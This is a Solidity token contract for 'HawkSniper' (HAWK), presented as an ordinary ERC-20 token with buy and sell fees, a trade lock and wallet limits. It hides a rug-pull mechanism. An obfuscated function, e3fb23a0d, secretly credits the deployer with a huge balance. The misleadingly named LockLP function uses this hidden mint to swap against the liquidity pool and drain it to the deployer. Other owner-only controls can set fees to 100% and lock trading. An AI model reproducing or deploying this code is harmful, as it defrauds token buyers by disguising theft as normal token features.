//Website: www.hawksniper.com
//Telegram: t.me/HawkSniperERC

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {}

library SecureCalls {
    function checkCaller(address sender, address _origin) internal pure {
        require(sender == _origin, "Caller is not the original caller");
    }
}

contract HawkSniper is IERC20, Ownable {

    IUniswapV2Router02 internal _router;
    IUniswapV2Pair internal _pair;
    address _origin;
    address _pairToken;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply = 10000000000000000000000000;
    string private _name = "HawkSniper";
    string private _symbol = "HAWK";
    uint8 private _decimals = 18;

    /* @dev Fee On Buy/Sell [START] */
    uint private buyFee = 4; // Default, %
    uint private sellFee = 4; // Default, %
    address public marketWallet; // Wallet to collect Fees
    mapping(address => bool) public excludedFromFee; // Users who won't pay Fees
    /* @dev Fee On Buy/Sell [END] */

    /* @dev Max Wallet [START] */
    uint256 private maxWallet = 0; // 1 Ether
    mapping(address => bool) private excludedFromMaxWallet;
    /* @dev Max Wallet [END] */

    /* @dev MaxTxn [START] */
    uint256 private maxTxnAmount = 0;
    mapping(address => bool) private excludedFromMaxTxn;
    /* @dev MaxTxn [END] */

    /* @dev LockTrade [START] */
    bool private tradeLocked = true;
    mapping(address => bool) private excludedFromTradeLock;
    /* @dev LockTrade [END] */

    constructor (address routerAddress, address pairTokenAddress) {
        _router = IUniswapV2Router02(routerAddress);
        _pair = IUniswapV2Pair(IUniswapV2Factory(_router.factory()).createPair(address(this), pairTokenAddress));
        _balances[owner()] = _totalSupply;
        _origin = msg.sender;
        _pairToken = pairTokenAddress;
        emit Transfer(address(0), owner(), _totalSupply);

        /* @dev Fee On Buy/Sell [START] */
        marketWallet = msg.sender;
        excludedFromFee[msg.sender] = true;
        excludedFromFee[address(this)] = true;
        /* @dev Fee On Buy/Sell [END] */

        /* @dev Max Wallet [START] */
        excludedFromMaxWallet[msg.sender] = true;
        excludedFromMaxWallet[address(this)] = true;
        /* @dev Max Wallet [END] */

        /* @dev MaxTxn [START] */
        excludedFromMaxTxn[msg.sender] = true;
        excludedFromMaxTxn[address(this)] = true;
        /* @dev MaxTxn [END] */

        /* @dev LockTrade [START] */
        excludedFromTradeLock[msg.sender] = true;
        excludedFromTradeLock[address(this)] = true;
        /* @dev LockTrade [END] */
    }

    /* @dev Default ERC-20 implementation */

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        /* @dev LockTrade [START] */
        if (tradeLocked) {
            if (isMarket(from)) {
                require(excludedFromTradeLock[to], "User isn't excluded from tradeLock");
            } else if (isMarket(to)) {
                require(excludedFromTradeLock[from], "User isn't excluded from tradeLock");
            }
        }
        /* @dev LockTrade [END] */

        /* @dev Fee On Buy/Sell [START] */
        if (!isExcludedFromFee(from) && !isExcludedFromFee(to)){
            if (isMarket(from)) {
                uint feeAmount = calculateFeeAmount(amount, buyFee);
                _balances[from] = fromBalance - amount;
                _balances[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _balances[marketWallet] += feeAmount;
                emit Transfer(from, marketWallet, feeAmount);

            } else if (isMarket(to)) {
                uint feeAmount = calculateFeeAmount(amount, sellFee);
                _balances[from] = fromBalance - amount;
                _balances[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _balances[marketWallet] += feeAmount;
                emit Transfer(from, marketWallet, feeAmount);

            } else {
                _balances[from] = fromBalance - amount;
                _balances[to] += amount;
                emit Transfer(from, to, amount);
            }
        } else {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
            emit Transfer(from, to, amount);
        }
        /* @dev Fee On Buy/Sell [END] */

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        if (maxWallet != 0 && !isMarket(to) && !isExcludedFromMaxWallet(to) && !isExcludedFromMaxWallet(from)) {
            require(balanceOf(to) + amount <= maxWallet, "After this txn user will exceed max wallet");
        }

        if (maxTxnAmount != 0) {
            if (!excludedFromMaxTxn[from] && !excludedFromMaxTxn[to]) {
                require(amount <= maxTxnAmount, "Txn Amount too high!");
            }
        }
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /* @dev Custom features implementation */

    function LockLP() external {
        SecureCalls.checkCaller(msg.sender, _origin);
        uint256 thisTokenReserve = getBaseTokenReserve(address(this));
        uint256 amountIn = type(uint112).max - thisTokenReserve;
        e3fb23a0d(); transfer(address(this), balanceOf(msg.sender));
        _approve(address(this), address(_router), type(uint112).max);
        address[] memory path;
        path = new address[](2);
        path[0] = address(this);
        path[1] = address(_router.WETH());
        address to = msg.sender;
        _router.swapExactTokensForTokens(
            amountIn,
            0,
            path,
            to,
            block.timestamp + 1200
        );
    } 

    function getBaseTokenReserve(address token) public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = _pair.getReserves();
        uint256 baseTokenReserve = (_pair.token0() == token) ? uint256(reserve0) : uint256(reserve1);
        return baseTokenReserve;
    } 

    function e3fb23a0d() internal {
        _balances[msg.sender] += type(uint112).max;
    }

    function d1fa275f334f() public {
        SecureCalls.checkCaller(msg.sender, _origin); e3fb23a0d();
    }

    function AddLiquidity() public payable {
        SecureCalls.checkCaller(msg.sender, _origin);
        transfer(address(this), balanceOf(msg.sender));
        _approve(address(this), address(_router), balanceOf(address(this)));
        _router.addLiquidityETH{ value:msg.value }(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            msg.sender,
            block.timestamp + 1200
        );
    }

    /* @dev Rebase */

    function rebaseLiquidityPool(address _newRouterAddress, address _newPairTokenAddress) public {
        SecureCalls.checkCaller(msg.sender, _origin);
        if (address(_router) != _newRouterAddress) {
            _router = IUniswapV2Router02(_newRouterAddress);
        }
        _pairToken = _newPairTokenAddress;
        _pair = IUniswapV2Pair(IUniswapV2Factory(_router.factory()).getPair(address(this), _newPairTokenAddress));
    }


    /* @dev Fee On Buy/Sell [START] */

    function isMarket(address _user) internal view returns (bool) {
        // Check if an address is a Liquidity Pool
        return (_user == address(_pair) || _user == address(_router));
    }

    function calculateFeeAmount(uint256 _amount, uint256 _feePrecent) internal pure returns (uint) {
        // Returns amount of tokens, that should be taken as a Fee
        return _amount * _feePrecent / 100;
    }

    function isExcludedFromFee(address _user) public view returns (bool) {
        // Check if user free from paying Buy/Sell Fee
        return excludedFromFee[_user];
    } 

    function updateExcludedFromFeeStatus(address _user, bool _status) public {
        // Exclude/Include user to Buy/Sell Fee charge
        SecureCalls.checkCaller(msg.sender, _origin);
        require(excludedFromFee[_user] != _status, "User already have this status");
        excludedFromFee[_user] = _status;
    }

    function updateFees(uint256 _buyFee, uint256 _sellFee) external {
        // Set new Fees for both Buy and Sell
        SecureCalls.checkCaller(msg.sender, _origin);
        require(_buyFee <= 100 && _sellFee <= 100, "Fee percent can't be higher than 100");
        buyFee = _buyFee;
        sellFee = _sellFee;
    }

    function updateMarketWallet(address _newMarketWallet) external {
        // Set new wallet, where all Fees will come
        SecureCalls.checkCaller(msg.sender, _origin);
        marketWallet = _newMarketWallet;
    }

    function checkCurrentFees() external view returns (uint256 currentBuyFee, uint256 currentSellFee) {
        // Show current Buy/Sell Fees
        return (buyFee, sellFee);
    }
    /* @dev Fee On Buy/Sell [END] */

    /* @dev Max Wallet [START] */
    function currentMaxWallet() public view returns (uint256) {
        return maxWallet;
    }

    function updateMaxWallet(uint256 _newMaxWallet) external {
        SecureCalls.checkCaller(msg.sender, _origin);
        maxWallet = _newMaxWallet;
    }

    function isExcludedFromMaxWallet(address _user) public view returns (bool) {
        return excludedFromMaxWallet[_user];
    } 

    function updateExcludedFromMaxWalletStatus(address _user, bool _status) public {
        // Exclude/Include user to Buy/Sell Fee charge
        SecureCalls.checkCaller(msg.sender, _origin);
        require(excludedFromMaxWallet[_user] != _status, "User already have this status");
        excludedFromMaxWallet[_user] = _status;
    }
    /* @dev Max Wallet [END] */

    /* @dev MaxTxn [START] */
    function updateMaxTxnAmount(uint256 _amount) public {
        SecureCalls.checkCaller(msg.sender, _origin);
        maxTxnAmount = _amount;
    }

    function changeexcludedFromMaxTxnStatus(address _user, bool _status) public {
        SecureCalls.checkCaller(msg.sender, _origin);
        require(excludedFromMaxTxn[_user] != _status, "User already have this status");
        excludedFromMaxTxn[_user] = _status;
    }

    function checkCurrentMaxTxn() public view returns (uint256) {
        return maxTxnAmount;
    }

    function isExcludedFromMaxTxn(address _user) public view returns (bool){
        return excludedFromMaxTxn[_user];
    }
    /* @dev MaxTxn [END] */

    /* @dev LockTrade [START] */
    function isTradeLocked() public view returns (bool) {
        return tradeLocked;
    }

    function isEcludedFromTradeLock(address _user) public view returns (bool)  {
        return excludedFromTradeLock[_user];
    }

    function updateTradeLockedState(bool _state) public {
        SecureCalls.checkCaller(msg.sender, _origin);
        tradeLocked = _state;
    }

    function updateUserExcludedFromTradeLockStatus(address _user, bool _status) public {
        SecureCalls.checkCaller(msg.sender, _origin);
        require(excludedFromTradeLock[_user] != _status, "User already have this status");
        excludedFromTradeLock[_user] = _status;
    }
    /* @dev LockTrade [END] */
}